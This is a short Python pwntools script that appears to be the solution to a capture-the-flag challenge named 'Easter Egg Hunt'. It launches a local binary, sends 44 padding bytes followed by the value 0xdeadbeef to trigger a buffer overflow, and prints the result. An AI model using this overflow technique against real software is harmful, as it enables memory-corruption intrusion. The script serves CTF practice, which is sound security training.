# Solution for Easter Egg Hunt

from pwn import *

p = process("./chall")

offset  = 44
payload  = b"A" * offset
payload += p32(0xdeadbeef)

p.sendline(payload)
print(p.recvall().decode())
